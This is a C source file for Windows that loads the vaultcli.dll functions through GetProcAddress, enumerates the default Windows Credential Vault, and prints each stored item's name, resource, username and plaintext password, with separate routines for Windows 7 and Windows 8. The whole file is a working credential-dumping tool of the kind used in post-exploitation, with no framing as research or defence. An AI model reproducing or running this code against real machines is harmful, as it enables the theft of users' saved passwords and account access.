
#include "windows.h"
#include <stdio.h>

typedef NTSTATUS (WINAPI *VaultOpenVault_t) (DWORD*, DWORD, PHANDLE );
typedef NTSTATUS (WINAPI *VaultCloseVault_t) (PHANDLE);
typedef NTSTATUS (WINAPI *VaultEnumerateItems_t) (HANDLE hVault, DWORD, DWORD*, DWORD* );
typedef NTSTATUS (WINAPI *VaultGetItemWin8_t) (HANDLE hVault, DWORD*, DWORD*, DWORD*, DWORD*, DWORD, DWORD, DWORD* );
typedef NTSTATUS (WINAPI *VaultGetItemWin7_t) (HANDLE hVault, DWORD*, DWORD*, DWORD*, DWORD*, DWORD, DWORD* );
typedef NTSTATUS (WINAPI *VaultFree_t) (DWORD*);

static VaultOpenVault_t pVaultOpenVault;
static VaultCloseVault_t pVaultCloseVault;
static VaultEnumerateItems_t pVaultEnumerateItems;
static VaultGetItemWin8_t pVaultGetItemWin8;
static VaultGetItemWin7_t pVaultGetItemWin7;
static VaultFree_t pVaultFree;

	
unsigned char valutdir[] =  {0x42,0xC4,0xF4,0x4B,0x8A,0x9B,0xA0,0x41,0xB3,0x80,0xDD,0x4A,0x70,0x4D,0xDB,0x28};	
unsigned char vaultfile[] = {0x99,0x54,0xCD,0x3C,0xA8,0x87,0x10,0x4B,0xA2,0x15,0x60,0x88,0x88,0xDD,0x3B,0x55};  

typedef struct vault_item_win8 
{
	unsigned char id[16];
    DWORD pName;
	DWORD pResource;
	DWORD pUsername;
	DWORD pPassword;
	DWORD unknown0;
	DWORD unknown1;
	DWORD unknown2;
	DWORD unknown3;
	DWORD unknown4;
	DWORD unknown5;

} VAULT_ITEM_WIN8;

typedef struct vault_item_win7
{
	unsigned char id[16];
    DWORD pName;
	DWORD pResource;
	DWORD pUsername;
	DWORD pPassword;
	unsigned char unknown0[8];
	unsigned char unknown1[8];
	DWORD unknown3;

} VAULT_ITEM_WIN7;


BOOL IsWindows8()
{
	OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    
	GetVersionEx(&osvi);

	if ((osvi.dwMajorVersion == 6) & (osvi.dwMinorVersion == 2))
		return TRUE;
	else
		return FALSE;
}


void DumpVaultWin7 ()
{
	NTSTATUS res = 0;
	HINSTANCE hVaultCliDLL = 0;
	HANDLE hVault = 0;
	DWORD count = 0;
	unsigned char* pBuffer = NULL;
	unsigned char* pBuffer2 = NULL;
	VAULT_ITEM_WIN7* pItem = NULL;

	char Name[256];
	char Resource[256];
	char Username[256];
	char Password[256];


	hVaultCliDLL = LoadLibraryA("vaultcli.dll");
	if (hVaultCliDLL == NULL) 
	{
		printf ("Cannot load vaultcli.dll library\n");
		goto exit;
	}

	// Load DLL functions
	pVaultOpenVault = (VaultOpenVault_t) GetProcAddress (hVaultCliDLL, "VaultOpenVault");
	pVaultCloseVault = (VaultCloseVault_t) GetProcAddress (hVaultCliDLL, "VaultCloseVault");
	pVaultEnumerateItems = (VaultEnumerateItems_t) GetProcAddress (hVaultCliDLL, "VaultEnumerateItems");
	pVaultGetItemWin7 = (VaultGetItemWin7_t) GetProcAddress (hVaultCliDLL, "VaultGetItem");
	pVaultFree = (VaultFree_t) GetProcAddress (hVaultCliDLL, "VaultFree");

	if (!pVaultOpenVault | !pVaultEnumerateItems | !pVaultCloseVault | !pVaultGetItemWin7 | !pVaultFree)
	{
		printf ("Cannot load vaultcli.dll functions\n");
		goto exit;
	}

	// Obtain the password Vault handler
	res = pVaultOpenVault ((DWORD*) valutdir, 0 , &hVault);
	if (res != 0)
	{
		printf ("Cannot open vault. Error (%d)\n", res);
		goto exit;
	}


	// Enumerate password vault items
	res = pVaultEnumerateItems (hVault, 512, &count , (DWORD*) &pBuffer);
	if (res != 0)
	{
		printf ("Cannot enumerate vault items. Error (%d)\n", res);
		goto exit;
	}

	if (count == 0)
	{
		printf ("Windows vault is empty\n");
		goto exit;
	}
	else
	{
		printf ("Default vault location contains %d items\n\n", count);
	}


	// Get the password for every item present in the default windows vault location
	for (unsigned int i=0; i<count; i++)
	{
		pItem = (VAULT_ITEM_WIN7*) &pBuffer[i*sizeof(VAULT_ITEM_WIN7)];
		if (memcmp (pItem->id, vaultfile, 16) == 0)
		{
			// Application 
			WideCharToMultiByte (CP_ACP, 0,(WCHAR*) pItem->pName, -1, Name, sizeof (Name), NULL, NULL);
			printf ("Name: %s\n", Name);
			// Resource 
			WideCharToMultiByte (CP_ACP, 0,(WCHAR*) (pItem->pResource+32), -1, Resource, sizeof (Resource), NULL, NULL);
			printf ("Resource: %s\n", Resource);
			// Username 
			WideCharToMultiByte (CP_ACP, 0,(WCHAR*) (pItem->pUsername+32), -1, Username, sizeof (Username), NULL, NULL);
			printf ("Username: %s\n", Username);

			pBuffer2 = 0;

			// Get Item's password
			res = pVaultGetItemWin7 (hVault, (DWORD*) pItem->id, (DWORD*) pItem->pResource, (DWORD*) pItem->pUsername , 0, 0, (DWORD*) &pBuffer2);

			if (res != 0)
			{
				printf ("Cannot retrieve item password. Error (%d)\n", res);
			}
			else
			{
				pItem = (VAULT_ITEM_WIN7*) pBuffer2;
				// Password 
				WideCharToMultiByte (CP_ACP, 0,(WCHAR*) (pItem->pPassword+32), -1, Password, sizeof (Password), NULL, NULL);
				printf ("Password: %s\n", Password);
			}

			// Free the buffer if necessary
			if (pBuffer2) pVaultFree ((DWORD*) pBuffer2);

			printf ("\n");

		}// end if
	}// end for 


exit:
			
	// Free the buffer if necessary
	if (pBuffer) pVaultFree ((DWORD*) pBuffer);
	
	// Close the password Vault handler
	if (hVault)
	{
		res = pVaultCloseVault (&hVault);
		if (res != 0)
		{
			printf ("Cannot close vault. Error (%d)\n", res);
		}
	}

	// Free library
	if (hVaultCliDLL) FreeLibrary (hVaultCliDLL);
}


void DumpVaultWin8 ()
{
	NTSTATUS res = 0;
	HINSTANCE hVaultCliDLL = 0;
	HANDLE hVault = 0;
	DWORD count = 0;
	unsigned char* pBuffer = NULL;
	unsigned char* pBuffer2 = NULL;
	VAULT_ITEM_WIN8* pItem = NULL;

	char Name[256];
	char Resource[256];
	char Username[256];
	char Password[256];


	hVaultCliDLL = LoadLibraryA("vaultcli.dll");
	if (hVaultCliDLL == NULL) 
	{
		printf ("Cannot load vaultcli.dll library\n");
		goto exit;
	}

	// Load DLL functions
	pVaultOpenVault = (VaultOpenVault_t) GetProcAddress (hVaultCliDLL, "VaultOpenVault");
	pVaultCloseVault = (VaultCloseVault_t) GetProcAddress (hVaultCliDLL, "VaultCloseVault");
	pVaultEnumerateItems = (VaultEnumerateItems_t) GetProcAddress (hVaultCliDLL, "VaultEnumerateItems");
	pVaultGetItemWin8 = (VaultGetItemWin8_t) GetProcAddress (hVaultCliDLL, "VaultGetItem");
	pVaultFree = (VaultFree_t) GetProcAddress (hVaultCliDLL, "VaultFree");

	if (!pVaultOpenVault | !pVaultEnumerateItems | !pVaultCloseVault | !pVaultGetItemWin8 | !pVaultFree)
	{
		printf ("Cannot load vaultcli.dll functions\n");
		goto exit;
	}

	// Obtain the password Vault handler
	res = pVaultOpenVault ((DWORD*) valutdir, 0 , &hVault);
	if (res != 0)
	{
		printf ("Cannot open vault. Error (%d)\n", res);
		goto exit;
	}


	// Enumerate password vault items
	res = pVaultEnumerateItems (hVault, 512, &count , (DWORD*) &pBuffer);
	if (res != 0)
	{
		printf ("Cannot enumerate vault items. Error (%d)\n", res);
		goto exit;
	}

	if (count == 0)
	{
		printf ("Windows vault is empty\n");
		goto exit;
	}
	else
	{
		printf ("Default vault location contains %d items\n\n", count);
	}

	// Get the password for every item present in the default windows vault location
	for (unsigned int i=0; i<count; i++)
	{
		pItem = (VAULT_ITEM_WIN8*) &pBuffer[i*sizeof(VAULT_ITEM_WIN8)];
		if (memcmp (pItem->id, vaultfile, 16) == 0)
		{
			// Application 
			WideCharToMultiByte (CP_ACP, 0,(WCHAR*) pItem->pName, -1, Name, sizeof (Name), NULL, NULL);
			printf ("Name: %s\n", Name);
			// Resource 
			WideCharToMultiByte (CP_ACP, 0,(WCHAR*) (pItem->pResource+32), -1, Resource, sizeof (Resource), NULL, NULL);
			printf ("Resource: %s\n", Resource);
			// Username 
			WideCharToMultiByte (CP_ACP, 0,(WCHAR*) (pItem->pUsername+32), -1, Username, sizeof (Username), NULL, NULL);
			printf ("Username: %s\n", Username);

			pBuffer2 = 0;

			// Get Item's password
			res = pVaultGetItemWin8 (hVault, (DWORD*) pItem->id, (DWORD*) pItem->pResource, (DWORD*) pItem->pUsername , 0, 0, 0, (DWORD*) &pBuffer2);

			if (res != 0)
			{
				printf ("Cannot retrieve item password. Error (%d)\n", res);
			}
			else
			{
				pItem = (VAULT_ITEM_WIN8*) pBuffer2;
				// Password 
				WideCharToMultiByte (CP_ACP, 0,(WCHAR*) (pItem->pPassword+32), -1, Password, sizeof (Password), NULL, NULL);
				printf ("Password: %s\n", Password);
			}

			// Free the buffer if necessary
			if (pBuffer2) pVaultFree ((DWORD*) pBuffer2);

			printf ("\n");

		}// end if
	}// end for 


exit:
			
	// Free the buffer if necessary
	if (pBuffer) pVaultFree ((DWORD*) pBuffer);
	
	// Close the password Vault handler
	if (hVault)
	{
		res = pVaultCloseVault (&hVault);
		if (res != 0)
		{
			printf ("Cannot close vault. Error (%d)\n", res);
		}
	}

	// Free library
	if (hVaultCliDLL) FreeLibrary (hVaultCliDLL);
}

void DumpVault ()
{
	if (IsWindows8())
		DumpVaultWin8();
	else
		DumpVaultWin7();
}


